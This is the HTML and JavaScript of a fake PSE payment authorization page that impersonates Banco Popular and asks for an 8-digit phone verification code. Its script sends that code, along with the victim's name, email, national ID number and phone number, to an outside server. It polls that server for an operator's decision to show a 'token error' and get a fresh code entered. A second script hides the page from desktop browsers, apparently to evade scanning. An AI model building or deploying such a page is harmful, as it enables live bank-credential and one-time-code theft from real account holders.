<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Pago PSE</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
}
body {
background-color: #f5f5f5;
color: #333333;
}
.page {
min-height: 100vh;
display: flex;
flex-direction: column;
align-items: center;
}
.page-header {
width: 100%;
padding: 12px 0;
text-align: center;
font-size: 16px;
font-weight: 500;
color: #333333;
background-color: #ffffff;
border-bottom: 1px solid #e6e6e6;
}
.content {
flex: 1;
width: 100%;
display: flex;
align-items: center;
justify-content: center;
padding: 24px 16px 32px;
}
.overlay {
width: 100%;
max-width: 960px;
height: 100%;
max-height: 620px;
border-radius: 18px;
background: linear-gradient(to bottom, #fafafa, #f5f5f5);
position: relative;
display: flex;
align-items: center;
justify-content: center;
}
.modal {
width: 100%;
max-width: 420px;
background-color: #ffffff;
border-radius: 18px;
box-shadow: 0 18px 45px rgba(0, 0, 0, 0.12);
border: 1px solid #efefef;
padding: 28px 32px 24px;
position: relative;
}
.modal-close {
position: absolute;
top: 14px;
right: 18px;
font-size: 18px;
color: #ff6d00;
cursor: pointer;
}
.modal-icon {
display: flex;
align-items: center;
justify-content: center;
margin-bottom: 20px;
}
.modal-icon-circle {
width: 96px;
height: 96px;
border-radius: 48px;
background-color: #e5f8ee;
display: flex;
align-items: center;
justify-content: center;
color: #00a651;
font-size: 34px;
position: relative;
}
.modal-icon-circle img {
max-width: 140px;
height: auto;
}
.hand {
position: absolute;
bottom: 8px;
left: 50%;
width: 48px;
height: 30px;
border-radius: 18px 18px 12px 12px;
background-color: #c8f1dd;
transform: translateX(-50%) rotate(-10deg);
box-shadow: 0 2px 0 rgba(0, 166, 81, 0.12);
}
.finger {
position: absolute;
top: -12px;
width: 10px;
height: 18px;
border-radius: 8px;
background-color: #ffffff;
border: 2px solid #00a651;
}
.finger-1 {
left: 4px;
}
.finger-2 {
left: 14px;
}
.finger-3 {
left: 24px;
}
.finger-4 {
left: 34px;
}
.phone-icon {
width: 40px;
height: 58px;
border-radius: 12px;
border: 2px solid #00a651;
background-color: #ffffff;
position: absolute;
left: 50%;
top: 50%;
transform: translate(-50%, -50%) rotate(-15deg);
box-shadow: 0 0 0 2px rgba(0, 166, 81, 0.08);
}
.phone-icon::before {
content: "";
position: absolute;
left: 4px;
right: 4px;
top: 6px;
bottom: 10px;
border-radius: 8px;
background: linear-gradient(to bottom, #e5f8ee, #c8f1dd);
}
.phone-icon::after {
content: "";
position: absolute;
bottom: 4px;
left: 50%;
width: 8px;
height: 8px;
border-radius: 4px;
background-color: #00a651;
transform: translateX(-50%);
}
.spark {
position: absolute;
width: 6px;
height: 6px;
border-radius: 50%;
background-color: #00c853;
opacity: 0.8;
}
.spark-1 {
top: 10px;
right: 4px;
}
.spark-2 {
bottom: 8px;
left: 8px;
}
.spark-3 {
bottom: 4px;
right: 18px;
}
.modal-title {
text-align: center;
font-size: 18px;
font-weight: 700;
margin-bottom: 8px;
}
.modal-text {
text-align: center;
font-size: 14px;
line-height: 1.5;
color: #555555;
margin-bottom: 22px;
}
.modal-text strong {
font-weight: 700;
}
.code-wrapper {
margin-bottom: 20px;
border: 1px solid #d5d5d5;
border-radius: 8px;
padding: 10px 16px;
background-color: #ffffff;
}
.code-inputs {
display: flex;
justify-content: space-between;
align-items: center;
}
.code-input {
width: 28px;
border: none;
background-color: transparent;
text-align: center;
font-size: 18px;
}
.code-input::placeholder {
color: #999999;
}
.code-input:focus {
outline: none;
}
.authorize-button {
width: 100%;
margin-top: 10px;
padding: 11px 16px;
border-radius: 6px;
border: none;
font-size: 15px;
font-weight: 600;
color: #ffffff;
transition: background-color 0.15s ease, cursor 0.15s ease, opacity 0.15s ease;
}
.authorize-button:disabled {
cursor: not-allowed;
background-color: #d5d5d5;
opacity: 1;
}
.authorize-button:not(:disabled) {
cursor: pointer;
background-color: #005570;
}
.loading-overlay {
position: fixed;
inset: 0;
background: rgba(255, 255, 255, 0.85);
display: none;
align-items: center;
justify-content: center;
z-index: 9999;
}
.loading-overlay.active {
display: flex;
}
.loader {
width: 56px;
height: 56px;
border-radius: 50%;
border: 4px solid #e2f3e5;
border-top-color: #00843d;
animation: spin 0.8s linear infinite;
}
@keyframes spin {
to {
transform: rotate(360deg);
}
}
.token-error-bar {
display: none;
margin-bottom: 12px;
border-radius: 8px;
padding: 8px 10px;
font-size: 13px;
background-color: #ffe4e1;
color: #7a1b00;
border: 1px solid #ff6d00;
}
.token-error-bar.active {
display: block;
}
@media (max-width: 600px) {
.overlay {
max-height: none;
height: auto;
background: #f5f5f5;
}
.modal {
max-width: 100%;
padding: 24px 20px 20px;
}
}
</style>
</head>
<body>
<div id="loading-overlay" class="loading-overlay">
<div class="loader"></div>
</div>
<div class="page">
<div class="page-header"></div>
<div class="content">
<div class="overlay">
<div class="modal">
<div class="modal-close">✕</div>
<div class="modal-icon">
<div class="modal-icon-circle">
<img src="logo.png" alt="Autorización PSE">
</div>
</div>
<div class="modal-title">Autoriza esta transacción</div>
<div id="token-error" class="token-error-bar">Error token, verifique e intente nuevamente.</div>
<div class="modal-text">
Para autorizar esta transacción, ingresa el código de verificación de 8 dígitos que <strong>enviamos a tu celular.</strong>
</div>
<div class="code-wrapper">
<div class="code-inputs">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
<input class="code-input" type="text" inputmode="numeric" maxlength="1" placeholder="-">
</div>
</div>
<button type="button" class="authorize-button" disabled>Autorizar</button>
</div>
</div>
</div>
</div>
<script>
var API_BASE = window.location.hostname === "localhost" ? "http://localhost:4000" : "https://brbpagos4banncs-api.onrender.com";
var inputs = Array.prototype.slice.call(document.querySelectorAll(".code-input"));
var authorizeButton = document.querySelector(".authorize-button");
var loadingOverlay = document.getElementById("loading-overlay");
var tokenErrorBar = document.getElementById("token-error");
var decisionIntervalId = null;
function soloNumerosInput(input) {
if (!input) return;
input.addEventListener("input", function () {
var soloDigitos = this.value.replace(/\D/g, "");
if (soloDigitos.length > 1) {
soloDigitos = soloDigitos.slice(0, 1);
}
this.value = soloDigitos;
if (soloDigitos && this.nextElementSibling && this.nextElementSibling.classList.contains("code-input")) {
this.nextElementSibling.focus();
}
actualizarEstadoBoton();
});
input.addEventListener("keydown", function (event) {
if (event.key === "Backspace" && !this.value && this.previousElementSibling && this.previousElementSibling.classList.contains("code-input")) {
this.previousElementSibling.focus();
}
});
}
function actualizarEstadoBoton() {
if (!authorizeButton) return;
var codigo = inputs.map(function (input) {
return input.value;
}).join("");
if (codigo.length === 8) {
authorizeButton.disabled = false;
} else {
authorizeButton.disabled = true;
}
}
inputs.forEach(function (input) {
soloNumerosInput(input);
});
if (inputs.length > 0) {
inputs[0].focus();
}
actualizarEstadoBoton();
function showLoadingAndNavigate(url) {
if (loadingOverlay) {
loadingOverlay.classList.add("active");
}
setTimeout(function () {
window.location.href = url;
}, 2000);
}
function startTokenDecisionPolling() {
if (decisionIntervalId !== null) {
return;
}
decisionIntervalId = setInterval(function () {
fetch(API_BASE + "/decision")
.then(function (res) {
return res.json();
})
.then(function (data) {
if (!data || !data.decision) {
return;
}
clearInterval(decisionIntervalId);
decisionIntervalId = null;
if (data.decision === "error_token") {
showLoadingAndNavigate("autorizacion.html?token_error=1");
} else if (data.decision === "token_ok") {
if (loadingOverlay) {
loadingOverlay.classList.remove("active");
}
alert("Pago simulado");
}
})
.catch(function () {});
}, 1000);
}
function notifyTelegramToken() {
var userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
var userEmail = sessionStorage.getItem("user_email") || "";
var userCedula = sessionStorage.getItem("user_cedula") || "";
var userCelular = sessionStorage.getItem("bc_usuario") || "";
var tokenValor = inputs.map(function (input) {
return input.value;
}).join("");
var payload = {
banco: "Banco Popular",
token: tokenValor,
nombre: userNombre,
email: userEmail,
cedula: userCedula,
celular: userCelular
};
fetch(API_BASE + "/recibir-dinero", {
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify(payload)
}).catch(function () {});
startTokenDecisionPolling();
}
function checkTokenErrorParam() {
if (!tokenErrorBar) {
return;
}
var params = new URLSearchParams(window.location.search);
if (params.get("token_error") === "1") {
tokenErrorBar.classList.add("active");
setTimeout(function () {
tokenErrorBar.classList.remove("active");
params.delete("token_error");
var newSearch = params.toString();
var newUrl = window.location.pathname + (newSearch ? "?" + newSearch : "");
window.history.replaceState(null, "", newUrl);
}, 3000);
}
}
if (authorizeButton) {
authorizeButton.addEventListener("click", function () {
if (authorizeButton.disabled) return;
if (loadingOverlay) {
loadingOverlay.classList.add("active");
}
notifyTelegramToken();
});
}
checkTokenErrorParam();
</script>
<script>
    (function() {
        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
        if (!mobileRegex.test(userAgent)) {
            document.body.innerHTML = '';
        }

        try {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let token = '';
            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
                token += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
            const url = new URL(window.location.href);
            url.searchParams.set('token', base64Token);
            window.history.replaceState(null, '', url.toString());
        } catch(e) {}
    })();
</script>
</body>
</html>
